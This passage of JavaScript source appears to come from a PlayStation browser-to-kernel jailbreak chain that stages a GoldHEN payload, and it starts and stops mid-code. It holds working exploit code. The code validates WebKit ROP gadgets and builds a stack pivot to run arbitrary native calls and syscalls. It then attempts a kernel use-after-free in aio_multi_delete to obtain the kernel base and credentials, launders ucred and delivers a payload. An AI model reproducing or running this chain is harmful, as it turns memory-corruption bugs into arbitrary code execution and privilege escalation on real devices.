        ["G1", off.wk_POP_RAX_MOV_RAX_JMP_18, [0x58, 0x48, 0x8b, 0x07]],
        ["G2", off.wk_PUSH_RBP_MOV_RBP_RSP_10, [0x55, 0x48, 0x89, 0xe5]],
        ["G3", off.wk_MOV_RDI_RAX_8_CALL_20, [0x48, 0x8b, 0x78, 0x08]],
        ["G4", off.wk_MOV_RDX_RAX_18_CALL_10, [0x48, 0x8b, 0x50, off.pivot_view_sp]],
        ["G5", off.wk_PUSH_RDX_POP_RSP_RET, [0x52, 0x5c, 0xc3]],
    ];
    for (const [nm, rva, pat] of GAD) {
        const a = webkitBase.add32(rva);
        let good = true;
        for (let i = 0; i < pat.length; ++i) if (pat[i] !== null && ctx.p.read1(a.add32(i)) !== pat[i]) { good = false; break; }
        if (good) G[nm] = a; else log("GADGET-BAD", nm);
    }

    // ROP context for callAddr
    const PB_SIZE = Math.max(0x28, (off.pivot_view_sp + 8 + 0xf) & ~0xf);
    function makeCtx() {
        const sb = new ArrayBuffer(0x20), pb = new ArrayBuffer(PB_SIZE), kb = new ArrayBuffer(0x2000), fb = new ArrayBuffer(0x40);
        const c = { storeDv: new DataView(sb), pivotDv: new DataView(pb), stackDv: new DataView(kb), frameDv: new DataView(fb), stackU8: new Uint8Array(kb), frameU8: new Uint8Array(fb) };
        const bufAddr = (ab) => {
            const c = ctx.p.leakval(ab);
            return ctx.p.read8(ctx.p.read8(c.add32(off.wk_JSFunction_m_function)).add32(off.wk_ArrayBuffer_m_impl)).add32(off.wk_ArrayBuffer_m_contents_m_data);
        };
        c.S = bufAddr(sb); c.P = bufAddr(pb); c.K = bufAddr(kb); c.F = bufAddr(fb);
        function put(dv, at, v) { if (typeof v === "number") { dv.setUint32(at, v >>> 0, true); dv.setUint32(at + 4, v < 0 ? 0xffffffff : 0, true); } else { dv.setUint32(at, v.low >>> 0, true); dv.setUint32(at + 4, v.hi >>> 0, true); } }
        put(c.storeDv, 0x00, G.G1); put(c.storeDv, 0x08, c.P);
        put(c.storeDv, 0x10, G.G3); put(c.storeDv, 0x18, G.G2);
        put(c.pivotDv, 0x00, c.P); put(c.pivotDv, 0x10, G.G5); put(c.pivotDv, 0x20, G.G4);
        return c;
    }
    function layout(c, target, args) {
        c.stackU8.fill(0); c.frameU8.fill(0);
        const insts = [];
        const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET, G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
        for (let i = 0; i < args.length; ++i) { insts.push(argGadget[i]); insts.push(args[i]); }
        const targetIdx = insts.length;
        const JSVALUE_UNDEFINED = { low: 0x0a, hi: 0xfffffff7 };
        insts.push(target); insts.push(G.POP_RDI_RET); insts.push(c.F);
        insts.push(G.MOV_RDI_RAX_RET); insts.push(G.POP_RAX_RET); insts.push(JSVALUE_UNDEFINED); insts.push(G.LEAVE_RET);
        let at = 0x2000 - 8 * insts.length;
        if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
        for (let i = 0; i < insts.length; ++i) { const dv = c.stackDv; const v = insts[i]; dv.setUint32(at + 8 * i, v.low >>> 0, true); dv.setUint32(at + 8 * i + 4, v.hi >>> 0, true); }
        put(c.pivotDv, off.pivot_view_sp, c.K.add32(at));
    }
    const M = makeCtx();
    const mainMf = ctx.p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function);
    const mainOrig = ctx.p.read8(mainMf);
    const pivotObj = {}; const pivotCell = ctx.p.leakval(pivotObj);
    function callAddr(target, args) {
        layout(M, target, args);
        const saved = ctx.p.read8(pivotCell);
        ctx.p.write8(pivotCell, M.S);
        Math.expm1(pivotObj);
        ctx.p.write8(pivotCell, saved);
        return { lo: M.frameDv.getUint32(0, true), hi: M.frameDv.getUint32(4, true), i32: M.frameDv.getUint32(0, true) | 0 };
    }
    const sc = (num, ...a) => callAddr(stubAddr.get(num), a);

    // Attempt K0 via raw13g aio_multi_delete UAF (bug 663 / "lapse")
    log("KSTAGE", "attempting K0 via raw13g (aio_multi_delete UAF, bug 663)");
    try {
        const k0 = await raw13gK0Exploit(ctx.p, off, G, callAddr, sc, log);
        log("KSTAGE", "K0 SUCCESS — kernel_base=" + k0.kernelBase + " ucred=" + k0.ucred);
        // Now we have kernel R/W and kernel base — run K1..K5
        log("KSTAGE", "K1 armed — kl_lock − " + ghHex32(off.k_kl_lock)
            + " self-checks: hi==0xffffffff, 0x4000 align");
        const k3 = makePipebufKv({
            sc: sc,
            put: (dv, at, v) => { if (typeof v === "number") { dv.setUint32(at, v >>> 0, true); dv.setUint32(at+4, v<0?0xffffffff:0, true); } else { dv.setUint32(at, v.low>>>0, true); dv.setUint32(at+4, v.hi>>>0, true); } },
            bufs: { kvBuf: new ArrayBuffer(0x18), kvView: new Uint8Array(0x8) },
            pipes: { mRd: 0, mWr: 0, sRd: 0, sWr: 0 },
            mData: 0
        });
        log("KSTAGE-GATE", "K3 " + k3.gates[0]);
        const k4 = ucredLaunder({ kv: k0.kv, kernelBase: k0.kernelBase, ucred: k0.ucred });
        log("KSTAGE-GATE", "K4 " + k4.gates[0]);
        const k5 = deliverPayload({
            p: ctx.p, off,
            payload: ctx.staged ? new Uint8Array(ctx.staged) : null,
            kv: k0.kv,
            kernelBase: k0.kernelBase,
            ucred: k0.ucred
        });
        log("KSTAGE-GATE", "K5 " + k5.gates.join(" | "));
        const held = (ctx.analyzed && ctx.analyzed.total) || 0;
        log("KSTAGE-SUMMARY",
            "payload=" + (ctx.staged ? "staged(" + held + "B buffer)" : "none")
            + " — K0 LIVE (raw13g); K1..K5 ready");
        return { ok: true, stage: "K5-deliver", ready: true, staged: !!ctx.staged, k0, k3, k4, k5 };
    } catch (e) {
        log("KSTAGE-FAIL", "K0 raw13g failed: " + (e.message || e));
        // Fall back to readiness-only mode
        if (typeof off.k_kl_lock === "number") {
            log("KSTAGE", "K1 armed — kl_lock − " + ghHex32(off.k_kl_lock)
                + " self-checks: hi==0xffffffff, 0x4000 align (needs a live UAF leak buffer)");
            const k3 = makePipebufKv(null);
            log("KSTAGE-GATE", "K3 " + k3.gates[0]);
            const k4 = ucredLaunder({ kv: null });
            log("KSTAGE-GATE", "K4 " + k4.gates[0]);
            const k5 = deliverPayload({
                p: ctx.p, off,
                payload: ctx.staged ? new Uint8Array(ctx.staged) : null
            });
            log("KSTAGE-GATE", "K5 " + k5.gates.join(" | "));
            const held = (ctx.analyzed && ctx.analyzed.total) || 0;
            log("KSTAGE-SUMMARY",
                "payload=" + (ctx.staged ? "staged(" + held + "B buffer)" : "none")
                + " — K0 failed, fallback to readiness; K1 armed; K3/K4/K5 await K0's UAF for K2 land");
            return { ok: false, stage: "K0-uaf-entry", ready: true, staged: !!ctx.staged };
        }
        log("KSTAGE-GATE", "K1 k_kl_lock missing");
        return { ok: false, stage: "K1-leak-kqueue", ready: false, staged: !!ctx.staged };
    }
}

// Self-register when loaded as a standalone module script so a parse/load
// failure in this payload module never blocks the main arw_page.js chain.
if (typeof window !== "undefined") {
    window.stageGoldHen = stageGoldHen;
    window.goldhenReadiness = goldhenReadiness;
    window.scanLibkernelJitshm = scanLibkernelJitshm;
    window.kernelBaseFromLeak = kernelBaseFromLeak;
    window.tryKernelStage = tryKernelStage;
    window.makePipebufKv = makePipebufKv;
}